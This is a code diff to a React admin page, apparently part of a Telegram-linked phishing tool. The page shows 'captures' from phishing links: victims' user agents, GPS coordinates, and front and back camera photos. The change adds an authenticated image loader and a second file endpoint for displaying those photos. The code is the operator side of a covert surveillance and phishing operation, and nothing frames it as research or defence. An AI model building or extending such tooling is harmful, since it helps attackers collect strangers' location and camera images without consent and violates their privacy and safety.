@@ -1,4 +1,4 @@
-import { useState, useEffect, useCallback } from "react";
+import { useState, useEffect, useCallback, useRef } from "react";
 import { Layout } from "@/components/layout";
 import { useApiAuth, useTelegram } from "@/lib/telegram-context";
 import { API_BASE } from "@/lib/api";
@@ -10,6 +10,38 @@ import {
   Link2, Plus, Copy, Trash2, Eye, MapPin, Camera,
   Globe, User, Clock, ChevronLeft, Loader2, ExternalLink,
 } from "lucide-react";
+
+function AuthImage({ src, alt, className, headers }: { src: string; alt: string; className?: string; headers: Record<string, string> }) {
+  const [objectUrl, setObjectUrl] = useState<string | null>(null);
+  const [error, setError] = useState(false);
+  const urlRef = useRef<string | null>(null);
+
+  useEffect(() => {
+    let cancelled = false;
+    fetch(src, { headers })
+      .then((res) => {
+        if (!res.ok) throw new Error("Failed");
+        return res.blob();
+      })
+      .then((blob) => {
+        if (cancelled) return;
+        const url = URL.createObjectURL(blob);
+        urlRef.current = url;
+        setObjectUrl(url);
+      })
+      .catch(() => {
+        if (!cancelled) setError(true);
+      });
+    return () => {
+      cancelled = true;
+      if (urlRef.current) URL.revokeObjectURL(urlRef.current);
+    };
+  }, [src]);
+
+  if (error) return <div className={`${className} bg-muted/30 flex items-center justify-center text-[10px] text-muted-foreground`}>Failed to load</div>;
+  if (!objectUrl) return <div className={`${className} bg-muted/30 animate-pulse`} />;
+  return <img src={objectUrl} alt={alt} className={className} loading="lazy" />;
+}
 
 type PhishingLink = {
   id: number;
@@ -29,6 +61,8 @@ type Capture = {
   longitude: number | null;
   front_photo_key: string | null;
   back_photo_key: string | null;
+  front_file_id: string | null;
+  back_file_id: string | null;
   created_at: string;
 };
 
@@ -173,30 +207,48 @@ export function AdminPhishing() {
                     <p className="text-[10px] text-muted-foreground truncate">{cap.user_agent}</p>
 
                     <div className="grid grid-cols-2 gap-2">
-                      {cap.front_photo_key && (
+                      {(cap.front_file_id || cap.front_photo_key) && (
                         <div className="space-y-1">
                           <p className="text-[10px] text-muted-foreground flex items-center gap-1">
                             <Camera className="h-3 w-3" /> Front
                           </p>
-                          <img
-                            src={`${API_BASE}/phishing/photo/${cap.front_photo_key}`}
-                            alt="Front camera"
-                            className="w-full rounded-lg border border-border"
-                            loading="lazy"
-                          />
+                          {cap.front_file_id ? (
+                            <img
+                              src={`${API_BASE}/file/${cap.front_file_id}`}
+                              alt="Front camera"
+                              className="w-full rounded-lg border border-border"
+                              loading="lazy"
+                            />
+                          ) : (
+                            <AuthImage
+                              src={`${API_BASE}/phishing/photo/${cap.front_photo_key}`}
+                              alt="Front camera"
+                              className="w-full rounded-lg border border-border"
+                              headers={headers}
+                            />
+                          )}
                         </div>
                       )}
-                      {cap.back_photo_key && (
+                      {(cap.back_file_id || cap.back_photo_key) && (
                         <div className="space-y-1">
                           <p className="text-[10px] text-muted-foreground flex items-center gap-1">
                             <Camera className="h-3 w-3" /> Back
                           </p>
-                          <img
-                            src={`${API_BASE}/phishing/photo/${cap.back_photo_key}`}
-                            alt="Back camera"
-                            className="w-full rounded-lg border border-border"
-                            loading="lazy"
-                          />
+                          {cap.back_file_id ? (
+                            <img
+                              src={`${API_BASE}/file/${cap.back_file_id}`}
+                              alt="Back camera"
+                              className="w-full rounded-lg border border-border"
+                              loading="lazy"
+                            />
+                          ) : (
+                            <AuthImage
+                              src={`${API_BASE}/phishing/photo/${cap.back_photo_key}`}
+                              alt="Back camera"
+                              className="w-full rounded-lg border border-border"
+                              headers={headers}
+                            />
+                          )}
                         </div>
                       )}
                     </div>
